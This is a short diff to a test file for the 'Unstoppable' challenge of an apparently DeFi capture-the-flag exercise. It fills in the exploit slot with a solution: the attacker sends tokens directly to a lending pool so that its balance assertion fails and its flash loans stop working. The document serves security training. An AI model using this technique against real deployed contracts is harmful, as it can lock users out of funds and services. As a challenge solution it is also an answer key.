@@ -40,6 +40,13 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', attacker);
+        this.attackerReceiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+
+        // We need to break the assert statement in flash Loan function
+        // To exploit we just need to send token to contract
+        const attackToken = ethers.utils.parseEther('1');
+        await this.token.connect(attacker).transfer(this.pool.address, attackToken);
     });
 
     after(async function () {
